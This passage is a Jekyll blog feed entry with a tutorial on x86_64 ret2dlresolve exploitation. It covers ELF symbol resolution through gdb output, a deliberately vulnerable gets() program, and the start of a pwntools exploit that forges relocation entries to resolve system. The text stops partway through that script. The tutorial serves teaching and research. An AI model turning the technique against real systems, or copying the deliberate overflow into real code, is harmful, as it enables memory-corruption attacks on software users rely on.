<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2025-03-05T13:41:29+01:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Litios Blog</title><subtitle>Litios blog
</subtitle><author><name>David Fernandez</name></author><entry><title type="html">A technical deep-dive into x86_64 Ret2dlResolve</title><link href="http://0.0.0.0:4000/2024/05/11/ret2dlresolve.html" rel="alternate" type="text/html" title="A technical deep-dive into x86_64 Ret2dlResolve" /><published>2024-05-11T00:00:00+02:00</published><updated>2024-05-11T00:00:00+02:00</updated><id>http://0.0.0.0:4000/2024/05/11/ret2dlresolve</id><content type="html" xml:base="http://0.0.0.0:4000/2024/05/11/ret2dlresolve.html">&lt;pre style=&quot;font-size: 0.9vw; text-align: center&quot;&gt;
                                                                                                                               
                          .   *.#@ **./@@  %                              (%*@  %, %..@ @                     
                        @% *.@..,,,,@@ .# %, .                      @. * #..,,,,....*/**%%                      
                        #/% .@..@@@@@.**##*/ @                      @(@* #,,@@@@....%%/.**                        
                    @#/.........@@....,,..../, #                (   /*....,,,,,,,,,,..../,/#@                     
                @ *@#(........,*.%*../..@@..,,(/                  @.......,,%/(,*(,,........../%                  
                #  /.....,@/,#@.*.#.  ( %@,,....(% (         @,.....@@@. .(@ ...( ( @#(,@@....*(@@                
                 ,@,......* %#,(* @,,@/,#*@,....,%@          @.(....*,..*/.#((  (@@(@#.#@.....*.                  
              @ /@.,..../,.#..  @@@@@@@@/.*@....*,%%        @@*%....*, %  .@@@@@@@@ @. ,((.@,.@@,                 
        .*%%##(/.....,(#....@@@@@@@@@@@@@@,,* *....(% /*%.%%% @@,. @.@@...@@  @@@@@@@@@@./ %  @@/*  %%%%, .       
        ...@..,,,,..(/% ...@@@....,,..@@@@@@(. (....... ..,,*,.@,.(%,.@@@@....,,,,..@@@@@.(/..........@@@(@       
        ,,..,,**,,**.* /...@@@....@@..@@@@@@@ #(....,,,@..,,..,@..(*...,@@....@@@@..@@@@ @/@....,,,,,,.. /@       
        **,,....,,,,**@.,......@@@@@@@ .@@@@..(/....*,,,,..*,,,*.%/#........@@@@@@@@,.@@@@/.@#,,..,,,,,,.#@       
        ,,../%,,,,,,@@@@,@...@@@@@@@@@@@@@@@.@/#@@...@@%.*/*,,,.,#%*......@@@@@@@@@@.....@. *@*,..(%*,@@,.@       
            ,(,... ..@@@....@@@@@@@@@@@@@@@@@..@@@@@*,.,/# /....* /@......@@@@@@@@@@... @@@@*.@.,. @,             
            @#,... ..#@@....@@@@@@@@@@@@@@@@@./ @@@@*,(./#/*....%(/@......@@@@@@@@@@... @@@@/@@.@ ./,             
            ..,.@@*. @@@@@..@@@@@@@@@@@@@@@@@.%/@@@@( %@*(*@....(,/@,.....@@@@@@@@@@... @@..(%@..@/,@             
            , @,@@...(@@. ...@@@@@@@@@...@@@@@@......%@, @@@@@@@.,.%......@@@@@@@@@@..  @@ (#/..,.#.              
            , ,*.... /.@,.....@@@@@@.....@@@#.(,.....*%@@@#%.......,........@@@@@@....@@@@(*/@..,.*%              
            ( .*.... *@.,.....@@@@@@.....@@@/#/.....(  %.  (.....,.%........@@@@@@....@@,. # @@.,.%#              
            . %/.....,%@@@@.............@@@@# .@,,,,**.@...*((.,,.,*/*@...........@@@@@@,(,/..../,#%              
             @%@....,,(@ ..@..  @@@@@@@@.@.#,,.*/**%.  %@@.@##..,,..   @..  @@@@@@@@@@ #, @,.....%@               
                @ ,*....* .( (.*,,,, @(#(%@ ,,,,%#% .@      #,(@..,**,.@//@@....% @,((((..,,@./@,#                
                @#,,....,%,*#(.@@@@@,*/.#.@#,,,,%%%@.@      .,@*...,.@(#%/@*@@ @@@@ ,, ...,,*,,#/.                
                 # @....,,..%/.,((/(%* @@@@@,,,,.%@@  %%%%  . /,,%@@,@@...%**#.*, /./..,,,,,@.%%                  
                   ,%%....,.,,..........  .,,* /*    %%%%%%%  .@ @#@..,...............,,**(%##                    
                    ,@.*%/.@..........,,...(,#(@@   %%%%%%%%  @@/.#/,((...............,,@*@(                      
                    * ,/. .@........,,,,,,##@#. @   %%%%%%%%  @@.%,, ,(%..............,,#(  @                     
                        @@,@*@*#.*.@,*%#@%.(/%    @ %%%%%%%%%%  .,(,(*#(*  #@ #/%,/ /%@@                          
                        @@@@    ....    **,@      %%%%%%%%%%%%   @ *..%#@@  ..@@..    @@                          
                                        . (,@@@   %%%%%%%%%%%%    @ (.,,(*@.                                      
                                        ,/@@@@@   %%%%%%%%%%%%    @ %#*..( .                                      
                                        %%@ @@.@ %%%%%%%%%%%%%    @@(,.. #.@                                      
                                    ,. %@%  @@@%@ %%%%%%%%%%%%    @@ @,.(/.@                                      
                                    . #(@   @@.@  @ %%%%%%%%    @@@@.%/.%@...                                     
                                    (#/     @@.@  @ %%%%%%%%    @@@@%%@#@.(@(                                     
                                   , *%%        @@  %%%%%%%%        % %%. #%/.@%    @                             
                @@               %% .@.  @@.@  @@.@  %%%%%%  @@     @(%.  %....                                  
             %(,                #%... .%*,@#((%,*# %@@        @@#.,(,# @###@.. *%,%%@@            .               
            .%((                 ...@...@(@  ,,#,#@.@@      @@@@%@*/(@, # ..... (.%%              % *             
             %..*               /...%.@@@.. #@.#/###@@@@@@@@ ..//%(.#@  @...@... .(             %#(..             
            #@...%(.        @%%/................%# %%..@ %((*##%..................#*@%%%    %%,%.#..*.            
            /%*....@.#     /* .................. .  %#( ,*,# @@@.....................*%%(   %*.......*            
            %%,....... @.@%/....................# .. @@%*@..@........................ @#.. #,......#              
              @/......................................#@%%%.......................................,%              
                .................................... ./%%%.%(@..................................# ,%              
                ,/ %................................        %................................. //                 
                * %#................................*/    @@% ,%..............................%. /                
                    ............................./%           @(.#............................%                   
                       *//..................,.#.                . (@%%..................** %                      
                        (,,.(%.%%%@..#. #..((%%%                    **@....#.@@..(..,@%*, %%                      
                        @%%%,% @(.%@...%./,%%%%%                    %%.% %/.@.@...@%%%%(%(%%                      
&lt;/pre&gt;

&lt;h2 id=&quot;background-theory&quot;&gt;Background theory&lt;/h2&gt;

&lt;h3 id=&quot;elfs-and-symbols&quot;&gt;ELFs and symbols&lt;/h3&gt;

&lt;p&gt;ELFs define executable pieces as symbols. These symbols can later be used by other ELFs.&lt;/p&gt;

&lt;p&gt;In order to import symbols, the linker needs to connect these references so those addresses point to the right place.&lt;/p&gt;

&lt;p&gt;There are 2 options here:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Static linking&lt;/strong&gt;: the symbols will be resolved at compiled time and embedded into the final binary.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Dynamic linking&lt;/strong&gt;: this technique uses a process of resolving the symbol called relocation. &lt;a href=&quot;https://docs.oracle.com/cd/E23824_01/html/819-0690/chapter3-7.html&quot;&gt;Lazy binding&lt;/a&gt; (relocation at runtime) happens during the first call of the function through PLT and GOT.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;plt-and-got&quot;&gt;PLT and GOT&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;GOT (Global offset table) contains the actual addresses of the symbols (or the hook to resolve them)&lt;/li&gt;
  &lt;li&gt;PLT (Procedural Linking Table) contains short functions that make a call to the proper GOT entry.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;understanding-symbol-resolution&quot;&gt;Understanding symbol resolution&lt;/h3&gt;

&lt;p&gt;The flow that depicts how this happens is presented in the following diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/ret2dlresolve_unresolved.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s see what’s going on with a simple program that calls 2 functions:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main() {
    char buf[8];
    gets(buf);
    puts(buf);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Compile with:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ gcc test.c -no-pie -o test -fno-stack-protector&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Now, let’s fire gdb and see the result:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I have gef installed, in case the input does not match exactly but you should be able to follow along still!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; functions. This is translated as a call to the PLT entry for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets@plt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@plt&lt;/code&gt;:&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;    gef➤  disass main
   0x0000000000401163 &amp;lt;+0&amp;gt;:	endbr64
   0x0000000000401167 &amp;lt;+4&amp;gt;:	push   rbp
   0x0000000000401168 &amp;lt;+5&amp;gt;:	mov    rbp,rsp
   0x000000000040116b &amp;lt;+8&amp;gt;:	sub    rsp,0x10
   0x000000000040116f &amp;lt;+12&amp;gt;:	lea    rax,[rip+0xe8e]        # 0x402004
   0x0000000000401176 &amp;lt;+19&amp;gt;:	mov    rdi,rax
   0x0000000000401179 &amp;lt;+22&amp;gt;:	call   0x401050 &amp;lt;puts@plt&amp;gt;
   0x000000000040117e &amp;lt;+27&amp;gt;:	lea    rax,[rbp-0x10]
   0x0000000000401182 &amp;lt;+31&amp;gt;:	mov    rdi,rax
   0x0000000000401185 &amp;lt;+34&amp;gt;:	mov    eax,0x0
   0x000000000040118a &amp;lt;+39&amp;gt;:	call   0x401060 &amp;lt;gets@plt&amp;gt;
   0x000000000040118f &amp;lt;+44&amp;gt;:	lea    rax,[rbp-0x10]
   0x0000000000401193 &amp;lt;+48&amp;gt;:	mov    rdi,rax
   0x0000000000401196 &amp;lt;+51&amp;gt;:	call   0x401050 &amp;lt;puts@plt&amp;gt;
   0x000000000040119b &amp;lt;+56&amp;gt;:	mov    eax,0x0
   0x00000000004011a0 &amp;lt;+61&amp;gt;:	leave
   0x00000000004011a1 &amp;lt;+62&amp;gt;:	ret
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
  &lt;li&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets@plt&lt;/code&gt; consists of:&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;gef➤  disass 0x401060
Dump of assembler code for function gets@plt:
   0x0000000000401060 &amp;lt;+0&amp;gt;: endbr64 
   0x0000000000401064 &amp;lt;+4&amp;gt;: bnd jmp QWORD PTR [rip+0x2fb5]        # 0x404020 &amp;lt;gets@got.plt&amp;gt;
   0x000000000040106b &amp;lt;+11&amp;gt;: nop    DWORD PTR [rax+rax*1+0x0]
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
  &lt;li&gt;Function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;puts@plt&lt;/code&gt; consists of:&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;gef➤  disass 0x401050
Dump of assembler code for function puts@plt:
   0x0000000000401050 &amp;lt;+0&amp;gt;: endbr64 
   0x0000000000401054 &amp;lt;+4&amp;gt;: bnd jmp QWORD PTR [rip+0x2fbd]        # 0x404018 &amp;lt;puts@got.plt&amp;gt;
   0x000000000040105b &amp;lt;+11&amp;gt;: nop    DWORD PTR [rax+rax*1+0x0]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And where do they come from? Those values come from the PLTREL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rela.plt&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h4 id=&quot;pltrel-and-elf64_rel&quot;&gt;PLTREL and Elf64_Rel&lt;/h4&gt;

&lt;p&gt;The first piece of the puzzle is a structure called &lt;a href=&quot;https://llvm.org/doxygen/structllvm_1_1ELF_1_1Elf64__Rel.html&quot;&gt;Elf64_Rel&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;This structure contains two fields:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r_offset&lt;/code&gt;: This address points to the GOT address of the symbol.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r_info&lt;/code&gt;: This value actually represents two different pieces of information.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;symbol (getSymbol function)&lt;/code&gt;: this is used as an index for the list of Elf64_Sym, as in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;list_of_elf64_sym[symbol]&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type (getType function)&lt;/code&gt; we will talk more about this one later, but in our case it should be 7.&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; #define R_X86_64_JUMP_SLOT	7	/* Create PLT entry */
 assert (ELFW(R_TYPE)(reloc-&amp;gt;r_info) == ELF_MACHINE_JMP_SLOT);
 #define ELF_MACHINE_JMP_SLOT	R_X86_64_JUMP_SLOT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;If curious, other relocation types can be found at: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/arch/x86/include/asm/elf.h&lt;/code&gt; in the Linux kernel source code.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We can conveniently retrieve those values with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -r test&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;Relocation section &apos;.rela.plt&apos; at offset 0x500 contains

  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404018  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404020  000400000007 R_X86_64_JUMP_SLO 0000000000000000 gets@GLIBC_2.2.5 + 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;or through gdb, first by finding out the location of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rela.plt&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;info file&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0000000000400500 - 0x0000000000400530 is .rela.plt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and then inspecting the memory addresses.&lt;/p&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;If we check the memory values of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r_offset&lt;/code&gt; we can see:&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;gef➤  x/2wx 0x404020
0x404020 &amp;lt;gets@got.plt&amp;gt;: 0x00401040 0x00000000
gef➤  x/2wx 0x404018
0x404018 &amp;lt;puts@got.plt&amp;gt;: 0x00401030 0x00000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And those point to:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;gef➤  x/3i 0x00401030
   0x401030: endbr64 
   0x401034: push   0x0
   0x401039: bnd jmp 0x401020
gef➤  x/3i 0x00401040
   0x401040: endbr64 
   0x401044: push   0x1
   0x401049: bnd jmp 0x401020
gef➤  x/10i 0x401020
   0x401020: push   QWORD PTR [rip+0x2fe2]        # 0x404008
   0x401026: bnd jmp QWORD PTR [rip+0x2fe3]        # 0x404010
gef➤  x/2wx 0x404010
0x404010: 0xf7fd8d30 0x00007fff
gef➤  disass 0x00007ffff7fd8d30
Dump of assembler code for function _dl_runtime_resolve_xsavec:
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, both of them will push a value, then both will call a final part which will push another value (the same for both) and then call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_runtime_resolve_xsavec&lt;/code&gt;. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_runtime_resolve_xsavec&lt;/code&gt; will later call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_fixup&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Let’s break down what happened here. The code is way longer, but a simplistic view would be:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;_dl_fixup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Elf64_Rel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;JMPREL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Elf64_Sym&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SYMTAB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rel_entry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getSymbol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STRTAB&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sym_entry&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;st_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbol_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_dl_lookup_symbol_x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sym_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;link_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;...);&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// now call the resolved symbol with the right args&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We won’t get into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;link_map&lt;/code&gt; too much but it contains the information about the loaded libraries.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Reference for &lt;a href=&quot;https://github.com/lattera/glibc/blob/master/elf/dl-runtime.c#L61&quot;&gt;_dl_fixup&lt;/a&gt; code.
Reference for &lt;a href=&quot;https://github.com/bminor/glibc/blob/d49cd6a1913da9744b9a0ffbefb3f7958322382e/sysdeps/x86_64/dl-trampoline.h#L37&quot;&gt;_dl_runtime_resolve&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now it’s time to talk about the missing pieces Elf64_Sym, SYMTAB and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynsym&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h4 id=&quot;symtab-and-elf64_sym&quot;&gt;SYMTAB and Elf64_Sym&lt;/h4&gt;

&lt;p&gt;This structure has multiple fields, but the one we really care about is:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;st_name&lt;/code&gt;: this is the offset (not index) in STRTAB (or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynstr&lt;/code&gt;) of the string with the name of the function.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Reference for &lt;a href=&quot;https://llvm.org/doxygen/structllvm_1_1ELF_1_1Elf64__Sym.html&quot;&gt;Elf64_Sym&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;p&gt;So to recap what happens when &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; is called:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; is called, which actually is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets@plt&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;This plt entry references the address from the Elf64_Rel entry (r_offset).&lt;/li&gt;
  &lt;li&gt;This code pushes the index for the Elf64_Rel.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;link_map&lt;/code&gt; address is pushed.&lt;/li&gt;
  &lt;li&gt;We call _dl_runtime_resolve that gets the Elf64_Rel, gets the Elf64_Sym through the getSymbol(), gets the name of the actual function to be resolved, in our case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gets&lt;/code&gt; and calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dl_fixup&lt;/code&gt; to actually resolve the symbol.&lt;/li&gt;
  &lt;li&gt;Finally, before exiting, calls the function with the original arguments.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The final diagram after the symbol is resolved looks like:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/./assets/imgs/ret2dlresolve_resolved.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;Now the concept for the exploit is simple. We need to create fake Elf64_Rel and Elf64_Sym entries that contain
the needed pieces to resolve the symbol we want, in our case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;. Let’s see how we can craft it.&lt;/p&gt;

&lt;p&gt;The full exploit is as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./test&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#gdb.attach(p, gdbscript=&quot;b *main+61&quot;)
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;./test&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
	0x0000000000400318 - 0x0000000000400334 is .interp
	0x0000000000400338 - 0x0000000000400368 is .note.gnu.property
	0x0000000000400368 - 0x000000000040038c is .note.gnu.build-id
	0x000000000040038c - 0x00000000004003ac is .note.ABI-tag
	0x00000000004003b0 - 0x00000000004003cc is .gnu.hash
	0x00000000004003d0 - 0x0000000000400448 is .dynsym
	0x0000000000400448 - 0x0000000000400495 is .dynstr
	0x0000000000400496 - 0x00000000004004a0 is .gnu.version
	0x00000000004004a0 - 0x00000000004004d0 is .gnu.version_r
	0x00000000004004d0 - 0x0000000000400500 is .rela.dyn
	0x0000000000400500 - 0x0000000000400530 is .rela.plt
	0x0000000000401000 - 0x000000000040101b is .init
	0x0000000000401020 - 0x0000000000401050 is .plt
	0x0000000000401050 - 0x0000000000401070 is .plt.sec
	0x0000000000401070 - 0x0000000000401193 is .text
	0x0000000000401194 - 0x00000000004011a1 is .fini
	0x0000000000402000 - 0x0000000000402004 is .rodata
	0x0000000000402004 - 0x0000000000402040 is .eh_frame_hdr
	0x0000000000402040 - 0x0000000000402104 is .eh_frame
	0x0000000000403df8 - 0x0000000000403e00 is .init_array
	0x0000000000403e00 - 0x0000000000403e08 is .fini_array
	0x0000000000403e08 - 0x0000000000403fd8 is .dynamic
	0x0000000000403fd8 - 0x0000000000403fe8 is .got
	0x0000000000403fe8 - 0x0000000000404010 is .got.plt
	0x0000000000404010 - 0x0000000000404020 is .data
	0x0000000000404020 - 0x0000000000404028 is .bss
&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;load_addr&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ELF64_REL_LIST&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dynamic_value_by_tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;DT_JMPREL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;elf_load_address_fixup&lt;/span&gt;
